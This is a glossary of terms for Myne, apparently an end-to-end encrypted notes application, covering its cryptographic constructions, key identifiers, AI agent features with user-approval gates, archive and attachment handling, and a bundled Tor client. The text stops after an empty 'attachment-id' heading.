# Myne Glossary

> Canonical reference for terminology used across Myne specifications, threat model, vision, and decisions documents. The intended audience is an external cryptographer or security reviewer walking in cold, plus the founder six months from now disambiguating their own past writing.

---

## Overview & Conventions

### How to read this glossary

Entries are alphabetized in a single A–Z list (§ "Term entries"). Each entry carries a category tag for visual filtering. Terms that diverge from generic usage carry an explicit *Myne-divergent* flag — those are the most important entries.

Three small reference tables at the bottom (§ "Quick-reference indices") cover (a) primitives at a glance, (b) Myne-specific keys, (c) magic-byte and context-prefix registries.

### Category legend

| Tag | Meaning |
|---|---|
| 🔐 *Primitive* | A concrete cryptographic algorithm (Argon2id, SHA-256, etc.) |
| 🏗️ *Construction* | A composition or higher-level scheme (AEAD, CTX, KDF, etc.) |
| 🗝️ *Key/identifier* | A key, derived value, or identifier used by the Myne protocol |
| 📋 *Protocol* | A protocol-level concept (version byte, AAD prefix, magic bytes, etc.) |
| ⚠️ *Threat* | A threat-model term (adversary, asset, trust boundary, attack class) |
| 📦 *Product* | A product / architecture / deployment term (vault, hosted sync, Phase 1) |
| 🛠️ *Tooling* | A library, build artifact, or development tool |

### Notation

- *Myne-divergent* — the term is in widespread general use but Myne's definition or usage differs in a way a reader must know. These entries get longer treatment.
- *(retired YYYY-MM-DD)* — the term was removed from active use. Preserved for audit trail.
- "Used in:" — paths to the docs where the term is most authoritatively defined.
- "Reference:" — RFC, academic paper, or canonical specification source. Provided for primitives and constructions; product terms skip this line.

---

## Term entries

### **`_undecodable/`** &nbsp; 📦 *Product*

The directory the [myne-decrypt](#myne-decrypt) CLI writes a note's raw ciphertext blob into when that note fails to decode during a best-effort export. It is the salvage half of the "never produce a folder the user believes is complete" rule: the undecodable bytes are preserved rather than dropped, so nothing is destroyed even when the export is incomplete, and the `_FAILED.txt` manifest names what could not be read. The leading underscore keeps it out of the way of the exported note tree.

Used in: `decisions.md` 2026-09-07 (myne-md/myne#166)

### **AAD (Associated Authenticated Data)** &nbsp; 🏗️ *Construction*

*(Aliases: Associated Data, AD. Myne-divergent: no, but the canonical construction §5.2 is project-specific.)*

A byte string bound into an AEAD operation but not encrypted. The AEAD tag covers both the ciphertext and the AAD, so any AAD tampering causes tag verification to fail. Myne's AAD construction (`spec/protocol.md` §5.2) carries the protocol-version prefix `"myne.v0.1|"`, the protocol version byte, the items_key_id, the note_uuid, and (for content encryption) the content_type, plus (for the wrap operations in §3.1) the canonical KDF parameters block. The combination is what defeats downgrade, key-substitution, blob-substitution, and KDF-parameter-tampering attacks — all fail at the AEAD tag check rather than producing silently wrong plaintext.

Used in: `spec/protocol.md` §5.2, §3.1
Reference: RFC 5116 (AEAD generic interface).

### **AAD construction** &nbsp; 📋 *Protocol*

The full byte string passed as AAD to a Myne AEAD operation. Distinct from the generic AEAD concept in that Myne locks the format and binds project-specific fields. See `spec/protocol.md` §5.2 for the exact byte layout.

Used in: `spec/protocol.md` §5.2

### **AAD prefix** &nbsp; 📋 *Protocol*

The 10-byte ASCII string `"myne.v0.1|"` (including the trailing pipe) that begins every AAD in this protocol version. The next major version defines its own AAD prefix (not pre-allocated). The prefix domain-separates protocol versions at the AEAD tag level — a later-major client cannot accidentally decrypt a v0.1 blob.

Used in: `spec/protocol.md` §5.2

### **account** &nbsp; 📦 *Product* (deep entry, *Myne-divergent*)

*(Myne-divergent: yes (redefined 2026-09-07). Before that date "account" meant the vault itself; the two were one and the same.)*

The client-side ownership layer above the vault: one account can own multiple vaults. An account is a
purely local, sealed grouping: an **account record** (the device-local half) plus a sealed
**vault membership** field inside each member vault's metadata (the per-vault half). It carries no
cryptography of its own: each vault keeps its own account number, recovery phrase and `root_key`,
and the server's view is byte-identical to the pre-split world (it still sees unrelated per-vault
accounts). The account id is a random UUIDv7, distinct from the account number and from
`account_number_hash`. Grouping is a per-device organisational choice, so it never syncs and never
converges across devices (`sync-protocol.md` §10.3). Where the OS keychain is unavailable there is
no record and no grouping, and vaults keep working standalone.

Used in: `spec/protocol.md` §9.3.1, `spec/sync-protocol.md` §10.3

### **account record** &nbsp; 📦 *Product*

The device-local half of the account/vault split: a sealed record holding the account id, the member
vault ids and the account label, stored under an OS-keychain wrap key (the sealed-label-store
pattern). It is rebuilt from the on-disk vault scan when missing or corrupt, reconciled against
discovery (adopting appearing vaults, pruning deleted ones, pruning emptied accounts), and never
written in plaintext on any platform. Where the keychain is unavailable there is no record and no
grouping. The per-vault half is the **vault membership** field.

Used in: `spec/protocol.md` §9.3.1

### **account_number** &nbsp; 🗝️ *Key/identifier* (deep entry)

Myne's user identifier. A 20-character canonical value composed of 19 random Crockford base32 characters (95 bits of entropy) plus 1 Damm-32 check character, displayed as `MY-XXXX-XXXX-XXXX-XXXX-X`. The account number replaces email at signup; it is bearer-token semantics in Phase 2+ (anyone in possession of it can authenticate sync requests for that account, like a Mullvad VPN account) but it is **not** a key — it does not encrypt anything, and possession alone does not unlock a vault. The cryptographic role is via `account_number_hash`, which binds Argon2id salts to this account and prevents pre-computation attacks across accounts. In **multi-vault recovery** the account number gains an *optional selector* role: a user **may** type it so the host matches `account_number_hash` against on-disk `vault.meta` headers and jumps to that vault — **never required** (the picker is the primary path; the 24-word phrase stays the sole recovery secret; `decisions.md` 2026-06-09 "Multi-vault recovery").

Used in: `spec/account-number.md`, `spec/protocol.md` §8

### **account_number_hash** &nbsp; 🗝️ *Key/identifier* (deep entry, *Myne-divergent*)

*(Aliases: account hash. Myne-divergent: yes — one canonical truncation since 2026-07-13.)*

A SHA-256 hash of the canonical account number, truncated to 16 bytes: `SHA-256(canonical_account_number)[:16]`. **One canonical form for every use site** (revised 2026-07-13, `decisions.md`): Argon2id salt construction (§3.1 of the protocol spec, stored in `vault.meta`) and Phase 2+ server-side identification (`spec/account-number.md` §7 — the storage-namespace key, rate-limit key, and SCRAM identity) use the same value. An earlier draft specified a 32-byte truncation server-side "to avoid identifier reuse across uses"; that was superseded because a longer truncation of the same digest is a strict prefix-extension of the shorter one — it provides no separation (and a domain-separated input would buy nothing either, since the server stores each account's `vault.meta`, which embeds this hash, in that account's namespace). In **multi-vault recovery** the 16-byte `vault.meta` value doubles as an *optional* vault selector: when a user types their account number, the host recomputes `SHA-256(canonical)[:16]` and byte-matches it against each discovered vault's plaintext header field to jump to that vault (header-read only — no decrypt, no `auth_permits`; `decisions.md` 2026-06-09 "Multi-vault recovery").

Used in: `spec/protocol.md` §3.1, §8.3; `spec/account-number.md` §6, §7

### **accent completion** &nbsp; 📦 *Product*

The one surface where a completed task is drawn with state-by-fill: a finished row in the [task panel](#task-panel) fills its checkbox with `--accent` and strikes the task text through in `--accent`. A narrow, ruled exception to the canon rule that state is carried by icon and coloured text, never by a fill (`decisions.md` 2026-09-13, myne-md/myne#656). It is scoped to panel rows only — the editor's inline affordances keep the neutral treatment, the date chip's overdue ink stays `--danger` text, and the prohibition on a green check is untouched.

Used in: `decisions.md` 2026-09-13 (myne-md/myne#656); `docs/design/README.md` "Task completion"

### **accessibility level** &nbsp; 🛠️ *Tooling*

The gate state a [story catalogue](#story-catalogue) entry declares: `error` (the default, where axe must find nothing and a violation fails the build), `todo` (a known finding recorded rather than hidden, so the debt is visible and may shrink), or `off` (axe must not run, and the entry carries a reason naming a mechanism). It is the `off | todo | error` vocabulary a mature accessibility panel uses, and it exists so that "is this story gated, or is it not" is a stated fact rather than something inferred from whether a test happens to exist. `tests/stories/a11yLevels.test.tsx` is the gate; the Accessibility tab in the catalogue is a view, and says so.

Used in: `stories/src/a11y-level.ts`; `stories/src/stories/docs.tsx`

### **Active language set** &nbsp; 📦 *Product*

The set of bundled dictionaries the [spell checker](#spell-check) currently checks against (SYNC-11). A word is accepted if it is valid in **any** member of the set (set-union, no per-note language detection) or in the **Personal dictionary**. The set is settings-driven (Settings → Appearance language picker) and defaults to the OS locale when bundled, unioned with en-US; it is passed to the engine's batch check as the `spell_check` command's `langs` argument. v0.1 bundles 23 languages (Turkish deferred).

Used in: MYND-262, MYND-267; `src-tauri/src/spell/`.

### **adversary class** &nbsp; ⚠️ *Threat*

A category of attacker against which the threat model defines a specific defensive posture, each carrying an explicit Strong / Mitigated / Best-effort / Out-of-scope status. The catalog grows as the product does — A14 arrived with the browser clipper, A15 with the served web bundle — so `threat-model.md` §1 is the roster of record; refer to it rather than enumerating individual classes (or their count) here.

Used in: `threat-model.md` §1

### **AEAD (Authenticated Encryption with Associated Data)** &nbsp; 🏗️ *Construction*

A symmetric-encryption mode that simultaneously provides confidentiality of plaintext and authenticity of plaintext + associated metadata. Myne's AEAD construction is XChaCha20-Poly1305 wrapped in CTX commitment (`spec/protocol.md` §5.1).

Used in: `spec/protocol.md` §5
Reference: RFC 5116.

### **age** &nbsp; 🛠️ *Tooling*

A simple, modern file-encryption format and library by Filippo Valsorda. Myne does not use age in v0.1 but the research roadmap for a later major version considers age-style chunked AEAD streams for attachments. The canonical specification lives at the C2SP repository.

Used in: `decisions.md` 2026-04-28 (age/rage cited as the boring-crypto precedent for the RustCrypto stack); `spec/protocol.md` §2
Reference: https://github.com/C2SP/C2SP/blob/main/age.md

### **agent focus** &nbsp; 📦 *Product*

The conversation COLUMN of the [agent hub](#agent-hub) tab: the open [conversation](#conversation), with the note it is anchored to one click away, the run's live state, and the full [conversational AI chat](#conversational-ai-chat) surface. It sits beside the history rail rather than replacing it — the tab is one screen (`decisions/ai/0637`), and "focus" names the column, not a mode you enter. Reached by opening a row in the rail, by the "Agent: open on note" palette verb, or by the light panel's one exit control. It was the second of two VIEWS until 0633, and the two-view behaviour survives only where a pane is too narrow for both columns. Distinct from the light panel, which also shows one conversation: the panel is the shallow end, with no list, no search and no history chrome.

Used in: `decisions/ai/0634`; `decisions/ai/0637`

### **agent hub** &nbsp; 📦 *Product*

The deep surface for [agentic note editing](#agentic-note-editing): a singleton workspace tab listing every [conversation](#conversation) in the vault, newest first, searchable, each row openable, renameable and deletable, and each carrying its [note anchor](#note-anchor) when it has one. The tab is ONE screen — the history rail beside [agent focus](#agent-focus), the conversation column (`decisions/ai/0637`; it was two views until then, and that shape survives only where a pane is too narrow for both) — and the duplicate-forbid invariant makes "open the agent" a reveal rather than a second tab, from the palette, the ribbon and the panel alike. It is **not a stage** (it does not take the window, and a note stays open beside it), **not a modal** (you browse it rather than answer it, `decisions/ui/0633`), and **not a replacement for the light AI panel**, which keeps its place in the right panel's vocabulary as the shallow end of a depth pair. Behind the same `developer_mode` + `ai_enabled` gate as every other `ai.*` surface (`decisions/ai/0636`).

Used in: `decisions/ai/0634`; `decisions/ai/0636`; `decisions/ai/0637`

### **agent memory** &nbsp; 📦 *Product*

*(Alias: `vault.agent-memory`, `memories/<id>`; the memory roster and its per-entry blobs.)*

What the AI assistant remembers about the user across runs: a small, curated set of distilled claims (preferences, conventions, standing facts) the model wrote itself through the `remember` verb and the user can read, edit or delete in full. Persisted as vault content (`MYN1` catalog + `MYX1` per-entry blobs, `protocol.md` §9.25/§9.26): encrypted, synced Class-1, backed up, existing only while the `ai_enabled` opt-in is on. Writes are automatic (one per run, no approval dialog; `decisions/ai/0591`), and the compensating control is transparency plus gates: every entry is visible in the Settings panel and the chat popover, every model-written entry passed the schema + character-cap + injection scan + authorship + exclusion checks at write time and the scan again at injection time (a rejected update or user write is refused before it reaches disk, never persisted, never injected; a rejected MODEL create persists as `quarantined`, listed for review but never injected until a user edit clears it; `decisions/ai/0590`). Distinct from [conversations](#conversation) (the transcript, append-only) and from a note (never a write target). Cross-device by sync; delete-everywhere via the catalog tombstone.

Used in: `protocol.md` §9.25/§9.26; `decisions/ai/0590`; `decisions/ai/0591`; `threat-model.md` TB12/TB13 (2026-09-10 amendments)

### **agent personality** &nbsp; 📦 *Product*

*(Alias: `vault.personality`.)*

The user's standing voice directives for the AI (tone, length, language, formatting), persisted as one encrypted singleton (`MYZ1`, `protocol.md` §9.27) and injected into the agent's system turn beside the memory. **User-authored only**: written from Settings (and the mobile twin), never by the agent (no verb writes it). Syncs as whole-value LWW (one coherent voice, never merged directive-by-directive, the themes-palette rule), behind the same `ai_enabled` gate as [agent memory](#agent-memory). Distinct from [agent memory](#agent-memory) (model-written, self-updating) by authorship: the personality is what the user says, the memory is what the agent learned.

Used in: `protocol.md` §9.27; `decisions/ai/0590`; `sync-protocol.md` §10.2.7

### **agent run** &nbsp; 📦 *Product*

One invocation of [agentic note editing](#agentic-note-editing): a task the user asked for, an [agent scope](#agent-scope) they approved, and the [proposed edits](#proposed-edit) it produced. Host-side state with an identity, a cancel flag shared with the vault-lock teardown, and a running scope total. **Nothing about a run's LIVE state survives a vault lock**: the run table and the live transcript store are dropped on the same leg as the AI vector store. What changed with persisted [conversations](#conversation) (myne-md/myne#675): the turn a run leaves behind is now written to its conversation at settle (append-at-finalize), and since `decisions/ai/0583` that settled turn KEEPS the frozen proposal (anchors and replacements, verbatim note-derived text) alongside the run id, the counts, the scope label and the end tag. The historical copy is **read-only**: no re-apply affordance exists anywhere, because a frozen proposal may quote a note that has since changed, been trashed, or moved folders. The RAM half of the old claim still holds: `agentStore`'s live copy is dropped on every vault-leaving path, enforced by the lock-teardown guards. A run writes exactly one thing without approval: a single memory entry through the [remember verb](#remember-verb) (myne-md/myne#697, `decisions/ai/0591`); everything else about a run never writes, and applying is a separate act behind the user's approval.

Used in: `decisions.md` 2026-08-16, 2026-08-19, `decisions/ai/0581`, `decisions/ai/0583`, `threat-model.md` §7

### **agent scope** &nbsp; 📦 *Product*

The set of notes an [agent run](#agent-run) may read and change, held as a **resolved set of note ids** rather than as the folder or list the user named. Resolution happens once, at approval time, and nothing re-evaluates it: a note added to a granted folder afterwards is not inside what the user approved. `ai_excluded_folders` (SYNC-14) is applied to every grant, host-side, and the number of notes it removed is stated on the approval screen rather than dropped silently. There is deliberately no cap on how large a scope may become; what bounds accumulation is that every widening is separately approved and the total is shown continuously.

Used in: `decisions.md` 2026-08-16

### **agentic note editing** &nbsp; 📦 *Product*

The feature in which the AI proposes changes to the user's own notes and nothing reaches the vault until the user approves a diff (myne-md/myne#529), with exactly one exception: the [remember verb](#remember-verb) writes a memory entry without approval (myne-md/myne#697, `decisions/ai/0591`). Five verbs: edit a note body, append to a note body, create a note (the [append verb](#append-verb) was added by myne-md/myne#616), move a note to another folder (the [move verb](#move-verb) was added by myne-md/myne#848), and remember a fact about the user; deletion needs no verb because trashing is a `trashed:` frontmatter timestamp and therefore a body edit. Hard delete, rename, and operations ON a folder itself (creating, renaming, deleting one) are excluded **from the verb set**, which is not the same as unreachable: an approved anchored edit reaches frontmatter, so changing a `title:` line is a rename by the same mechanism trashing is, and what bounds it is that it appears in the diff the user approves. Moving a note is a verb of its own, stated below, so the folder field is not excluded from the set: what is excluded is every write that would change it WITHOUT naming the destination. **Moving a note is its own verb, and the [folder lock](#folder-lock) is checked BOTH ways**: an anchored edit still may not change a note's folder, and a move is refused when the note is in an excluded folder or when the destination is one, because the folder is what `ai_excluded_folders` is keyed on (`decisions/ai/0662`, which supersedes the refusal clause of `decisions/ai/0554`). Runs on both provider arms under the posture `decisions.md` 2026-08-09 set. It **supersedes the prompt-injection bound `threat-model.md` §7 used to state** (the model does now have tools) and replaces it with a claim about scope and approval that the same section names as behavioural rather than structural. Desktop only in v1; mobile is myne-md/myne#530, blocked on myne-md/myne#456.

Used in: `decisions.md` 2026-08-16, `threat-model.md` §7

### **agent turn** &nbsp; 📦 *Product*

How an [agent run](#agent-run) appears in the [conversational AI chat](#conversational-ai-chat) transcript: the task the user sent, carrying the [agent scope](#agent-scope) label it was sent under, and beside it the turn the run itself renders into. Both belong to the agent flow rather than to the chat, which is what keeps the task out of the ask model's conversation history. The run's turn holds counts and a closed end tag, never the [proposed edits](#proposed-edit). The run's LIVE state is on the turn's own footprint line (myne-md/myne#848): its status, its running scope total and its cost figures, which are ON the line while the run works and behind a disclosure once it settles, so a control the threat model requires to be continuously visible is readable without a press. The scope-expansion approval is the exception and stays outside the scrolling transcript: it is a modal question, and mounting it inside the region a reader has scrolled put it below their view.

Used in: `decisions.md` 2026-08-19

### **Ask mode / Edit mode** &nbsp; 📦 *Product*

**Retired, and kept as the term it is not.** This entry defined the two settings of the one composer in the AI Chat tab (myne-md/myne#533): Ask sent a grounded chat message, Edit started an [agent run](#agent-run) and revealed the user-originated scope control, and the tab opened in Ask. There are no modes now. `decisions.md` 2026-08-22 entry 0524 gave the tab ONE flow: every message starts an agent run, the agent answers a question with its `finish` summary and proposes edits when that is what was asked for, and the segmented control that used to choose the flow now chooses the **permission mode** (ask before applying, or apply inside the approved scope, `decisions.md` 2026-08-20 entry 0522). The scope control is unconditional, because every message now has a scope.

Kept rather than deleted because the retired names outlived the controls in three places at once: `ai.composer-mode-edit` was driven by every scenario in `e2e/agent-run.e2e.ts` for months after it stopped rendering, which killed that whole suite invisibly, and two comments in `ChatComposer.tsx` still described Edit-mode-only blocks (`decisions.md` 2026-08-28 entry 0538, myne-md/myne#596).

Used in: `decisions.md` 2026-08-19, 2026-08-22 entry 0524, 2026-08-28 entry 0538

### **append verb** &nbsp; 📦 *Product*

The third verb of [agentic note editing](#agentic-note-editing) (myne-md/myne#616): it adds text at the end of a note's body rather than replacing an [edit anchor](#edit-anchor). It exists because there was no way to write into an EMPTY note. An empty anchor is refused, so "add this list to the open note" failed for a structural reason no message explained, and the model answered by asking the user for the list it had just written. Appending to a long note was possible but expensive, since the model had to reproduce the whole tail verbatim as an anchor.

Two rules keep it from becoming a frontmatter writer, and both are about the RESULT rather than the input. The text is positioned after the note's frontmatter block rather than at the end of the raw file, so in a note that has one, appended text can never be the first line. And an append that would give the note a frontmatter block it did not have is refused outright, which closes the case positioning alone does not: a note whose body merely BEGINS with `---` has an opener nothing closed, and an ordinary `---` separator in the appended text would close it and turn the user's own first lines into frontmatter.

Used in: `decisions/ai/0554`

### **append-at-finalize** &nbsp; 📦 *Product*

The conversation write cadence: a [chat turn](#chat-turn) persists the moment it settles (stream closed, run settled, or failed, including the partial text of a stream interrupted by a lock), with no coalescing window. A lock that cuts a stream settles its partial text first and attempts the write with that snapshot; the lock wipe keeps no retry state, so a persist that fails at lock is lost with the RAM copy. Nothing rewrites a turn in place.

Used in: `spec/protocol.md` §9.24, §9.24.2, §9.24.4; `decisions/ai/0581`

### **aPAKE (Augmented Password Authentication Key Exchange)** &nbsp; 🏗️ *Construction*

A class of password-authenticated key exchange where the server stores no password verifier the attacker can brute-force offline after a database compromise. OPAQUE (RFC 9807) is the modern aPAKE Myne's later-major-version roadmap canonicalizes for sync-server authentication. v0.1 derives but does not transmit the relevant subkey; the actual aPAKE-vs-simple-verifier choice is deferred to Phase 2 (`spec/protocol.md` §11.1).

Used in: `decisions.md` (Deferred #4)
Reference: RFC 9807.

### **archive** &nbsp; 📦 *Product*

The indefinite-retention declutter layer: a note the user has set aside but keeps forever (no auto-purge), distinct from the Trash. Archiving hides a note from the working set (sidebar tree + favorites display) but — unlike trashing — leaves it discoverable in full-text search and resolvable as a wikilink/backlink target. Archive and trash are two positions on one *location* axis and are mutually exclusive: a note is at most one of live / archived / trashed. Backed by the value-strict [archived field](#archived-field) (MYND-331).

Used in: `spec/markdown-dialect.md` §3.6.1

### **archived field** &nbsp; 📋 *Protocol*

The eighth Myne-managed canonical frontmatter field, `archived:` — a **value-strict** RFC 3339 UTC timestamp marking when a note was archived (the exact twin of `trashed:`; any non-timestamp value leaves the note live). Written only by the archive/unarchive actions (`src/notes/archiveNote.ts`) via `patchArchivedField` over the existing `note_update` IPC; neither transition bumps `updated:`. Mutually exclusive with `trashed:` at the action layer. Rides the existing `.myn` AEAD envelope — no `protocol.md` magic-byte / AAD / version change (MYND-331). See [archive](#archive).

### **archived folder** &nbsp; 📦 *Product*

A folder archived as a **unit** (folder-archive): the whole subtree leaves the working set (sidebar tree + favorites + quick-open + saved-view results) while its notes stay resolvable as backlink/graph/tag targets and in full-text search — the folder-level twin of the per-note [archived field](#archived-field). Because the virtual-folder model has no folder entity to carry a marker, an archived folder is stored as a canonical trailing-slash path in the additive `archived_folders` set inside the encrypted `vault.prefs` (`MYP1`), the same codec as [deliberate folder](#deliberate-folder) / [AI-excluded folder](#ai-excluded-folder). Archiving writes **no** note frontmatter, so it composes independently with per-note archive (a note individually archived inside a folder stays archived when the folder is restored). Matched by folded-prefix (case-fold + NFC, sibling-safe: `Projects/` archives `Projects/Myne/` but not `ProjectsX/`); rename/delete re-root/trim the set. Restore/Delete-to-Trash from the Archive panel. See [archive](#archive), [folder](#folder).

### **Argon2id** &nbsp; 🔐 *Primitive* (deep entry)

The memory-hard password-based key derivation function specified in RFC 9106. Argon2id combines the side-channel resistance of Argon2i with the GPU-cracking resistance of Argon2d. Myne uses Argon2id at two call sites (deriving `password_wrap_key` from the master password, deriving `recovery_wrap_key` from the BIP-39 phrase), with parameters `m=256 MiB, t=3, p=2, version 1.3` stored in `vault.meta` rather than hardcoded so they can be tuned per platform and bound into the wrap AADs to defeat parameter-downgrade tampering. Argon2i and Argon2d are not used in this protocol — the "id" variant is the only correct choice for password-stretching in 2026.

Used in: `spec/protocol.md` §4, §3.1
Reference: RFC 9106.

### **arti sidecar** &nbsp; 🛠️ *Tooling*

The Tor client Myne bundles to serve [Tor routing mode](#tor-routing-mode): [arti](https://gitlab.torproject.org/tpo/core/arti) (the Tor Project's Rust implementation) built by the `tor-sidecar/` workspace-member binary crate as a standalone loopback **SOCKS5 proxy**, shipped as a Tauri `externalBin` alongside the `myne` CLI and spawned by the desktop host as a **separate process** when the user turns the toggle on. Two properties are the reason it is structured this way rather than linked in. It **holds no key material and no plaintext** — a bug in a Tor client cannot reach `root_key` or note content, because it never shares the address space that holds them. And **nothing depends on it**: it is a workspace member the desktop *spawns* rather than links, so arti stays outside `myne-desktop`'s `cargo tree -e normal` closure and the no-egress gate (`src-tauri/src/no_egress.rs`, `ai-no-network-check.sh`) still scans a tree containing no networked crate — the "Myne's own binary cannot originate a network request" property survives shipping a Tor client in the bundle. Its dependency tree does land in the single shared root `Cargo.lock` (TB9), which is the largest single dependency admission in the project and the first whose answer to "can this originate a network request?" is yes; the version is pinned exactly, because bundling it transfers Tor's security-update cadence onto Myne's release cadence. Launched with Myne's own generated `arti.toml` (so a pre-existing or hostile user-level arti config cannot redirect the proxy or enable a bridge), with a cached state directory under app data so entry-guard selections persist, and with its stderr classified into bare phase names and dropped rather than mirrored into any log — arti logs connection targets, which are exactly what Tor mode exists to hide.

Used in: `decisions.md` 2026-07-31; `threat-model.md` §7; `dependency-policy.md`

### **asset** &nbsp; ⚠️ *Threat*

A resource that the threat model identifies as worth protecting, classified by sensitivity (Critical / Sensitive / Pseudonymous / Metadata) and by visibility (client only, encrypted blob on server, plaintext on server, transient). The catalogued set grows with the product — AS18 and AS19 arrived with the pending-capture and share-import queues — so `threat-model.md` §2 is the table of record; read it there rather than tracking a count here.

Used in: `threat-model.md` §2

### **atomic range** &nbsp; 📦 *Product*

A region of CodeMirror 6 editor state registered with `EditorView.atomicRanges` so the cursor and selection treat it as a single indivisible unit. Backspace, forward delete, and arrow-key motion at the boundary remove or skip the entire range in one step. Myne uses atomic ranges to make wikilink chips behave as single characters at the user-input level — pressing Backspace next to `[[Note Title]]` deletes the whole chip (delimiters included) rather than chipping away one character at a time. The underlying source bytes are unchanged by atomicity registration; the property is purely about cursor mechanics.

Used in: `spec/wikilink.md` §5.2

### **at-fill registration** &nbsp; 📦 *Product*

The rule that a folder becomes a [deliberate folder](#deliberate-folder) the first time it holds a note, rather than only when the user reaches a "New folder" command (myne-md/myne#613). Creating a note in a folder, moving one into it, and importing a vault that contains it all register it; so does an explicit folder create. Nothing UNregisters it, in particular not its last note leaving, which is the behaviour the rule exists to produce: a folder made by dragging a note into a name the user typed is as deliberate as one made from a menu, and used to disappear silently when emptied because nothing had recorded it.

Registration is an ADD, never a whole-set write, so a client holding a stale view cannot claim a removal it never made. It is idempotent, and a client registers once per user operation rather than once per note: a fifty-note bulk move is one write, because each write re-encrypts the whole `vault.prefs` blob. A vault created before the rule is registered once, after unlock, by walking the folders its live notes prove; trashed and archived notes prove nothing, so a folder the user had already emptied is not resurrected. Bounded by the [set-field byte budget](#set-field-byte-budget).

Used in: `spec/protocol.md` §9.5.2; myne-md/myne#613

### **at-rest encryption** &nbsp; 🏗️ *Construction*

The property that data stored persistently is encrypted whenever it is not actively being processed. Myne's at-rest encryption applies to every byte of note content, vault metadata, and key material on the user's disk (`spec/protocol.md` §9). Distinct from in-transit encryption (TLS), which protects only data crossing the network.

Used in: `spec/protocol.md` §9; `threat-model.md` §1 (A5)

### **Automerge** &nbsp; 🛠️ *Tooling*

The Rust [CRDT](#crdt-conflict-free-replicated-data-type) library Myne adopts as its CRDT (`decisions.md` 2026-08-09, epic ledger ASM-11), superseding the roadmap's provisional [Yjs](#yjs). Chosen for Myne's constraints — Rust-native (compiles to wasm alongside `protocol`/`myne-core`), a proven whole-doc-snapshot-over-a-blind-store pattern, and the only first-party E2EE-CRDT sync line (Ink & Switch's Keyhive/Beelay) targeting a server that cannot decrypt. Merges already-decrypted content client-side (it is **not** crypto; its `sha2` is content-addressed change hashing, not key material). Used at-rest for the next-major `NC05` CRDT note-type (`automerge-sync-migration`) and, later, Phase-4 real-time collaboration.

Used in: `decisions.md` 2026-08-09; `dependency-policy.md` (ledger); `core/Cargo.toml`
Reference: https://automerge.org

### **auth_permits** &nbsp; 📦 *Product*

A capacity-1 `tokio::sync::Semaphore` on `VaultRuntimeState` (Rust-side singleton in `core/src/plugins/vault_unlock/state.rs`) held by **every command that creates, destroys, or mutates `vault.meta`**: `vault_unlock`, `vault_recover_with_phrase`, `vault_complete_recovery`, `vault_change_password`, `vault_delete`, `vault_create::commit`, and `vault_repair`. Each acquires via `try_acquire()` (reject, never queue) at the start of its critical section and releases via RAII guard on every return path. The single-permit invariant guarantees **at most one vault.meta-lifecycle mutation in flight client-wide** — a generalization of the original "at most one ~1-second Argon2id derivation in flight" framing, which became inaccurate once non-Argon2id members joined (`vault_delete` and `vault_repair` hold the permit for a pure filesystem sweep, not a KDF). It defends the no-queue posture (`decisions.md` 2026-05-02 "Phase 1 unlock UI semantics") and closes the `vault_repair` ↔ `vault_create::commit` TOCTOU (`decisions.md` 2026-06-06 "vault_repair v0.2", MYND-159). Renamed from `unlock_permits` (the pre-recovery-flow shape) when the recovery commands started sharing the lock.

Used in: `decisions.md` 2026-05-02 "Slot state machine + auth_permits generalization"

### **attachment** &nbsp; 📋 *Protocol*

An arbitrary file of **any type** stored as an encrypted blob in the vault, separate from notes (`threat-model.md` AS7). Each attachment is an [`MYA1`](#mya1) blob (`spec/protocol.md` §9.9) under `attachments/<attachment-id-hex>`, keyed by a per-attachment key wrapped under `itemsKey`; its metadata lives authoritatively in the [`vault.attachments`](#vaultattachments) catalog. Attachments ship in v0.1 (`decisions.md` 2026-06-07, superseding the 2026-04-27 skip-and-placeholder plan). A file the magic-byte sniffer recognizes as a renderable type (`image/*` + SVG + PDF) renders inline; **any other file is stored as `application/octet-stream` and surfaces as an export-only [attachment file-card](#attachment-file-card)** (`decisions.md` 2026-06-14, MYND-173). No remote URL is ever fetched; decrypted bytes never touch disk except on explicit user [export](#export). See [attachment-id](#attachment-id), [MYC1](#myc1). (MYND-164)

### **attachment catalog tombstone** &nbsp; 📋 *Protocol*

A [`vault.attachments`](#vaultattachments) entry whose optional `deleted_at` field is set (`spec/protocol.md` §9.10.2): the multi-device **deletion marker** for an [attachment](#attachment) under Phase 2 sync (`spec/sync-protocol.md` §11.4). Written at delete time with the entry's metadata **scrubbed** (filename/content-type emptied, size zeroed) so the synced catalog keeps nothing descriptive about a crypto-erased file; it defeats stale-catalog resurrection in the per-entry merge (the greater [merge version](#merge-version) wins, so a deliberate re-add — which observes the delete — outranks a stale live copy; on an equal-`version` tie the tombstone wins; myne-md/myne#405). Prunable client-side after the [tombstone horizon](#tombstone-horizon). **Distinct from** the [deleted-attachment tombstone](#deleted-attachment-tombstone), which is the *UI placeholder* an editor embed renders for an unresolvable id. Phase 2. (MYND-468)

### **attachment embed** &nbsp; 📦 *Product* *(Myne-divergent: yes; no Obsidian counterpart)*

The Myne form for embedding an encrypted [attachment](#attachment) in a note, `spec/wikilink.md` §2 **form 12**: `![[att:<attachment-id-hex>|filename]]`, historically called **form C**. The `att:` scheme prefix routes resolution to the `vault.attachments` catalog rather than the note index, and the remainder must be a 64-character lowercase-hex [attachment-id](#attachment-id); a prefix with an invalid id is not an attachment embed and degrades to an ordinary embed chip rather than erroring. It renders as an ATOMIC widget with no source-lift, so the caret never enters it and the `att:` target is never exposed as editable text: a user cannot hand-write or hand-edit one inside Myne, and every authoring affordance emits it instead. What it renders as is a serve-time decision (inline image, PDF reader, audio or video player, file card, or a tombstone for an id the catalog cannot resolve), not an ingest gate. **Where** it renders is a second serve-time decision with the same shape: an embed alone on its line, whitespace aside, is drawn as a whole-line BLOCK, and one sharing a line with prose stays inline. Every insert path Myne owns writes it onto a line of its own, so the block is the form a user meets; an embed already written mid-line, by an import or by hand, is never moved (myne-md/myne#604). It may carry [embed layout segments](#embed-layout-segment), which the block form can also author by drag. On an attachments-included export it is rewritten to a plain wikilink embed naming the exported file, carrying its layout segments in Obsidian’s own spelling where one exists, so it never reaches Obsidian in this form.

Used in: `spec/wikilink.md` §2 form 12, §2.1, §5.1; `spec/markdown-dialect.md` §6

### **attachment-id** &nbsp; 📋 *Protocol*

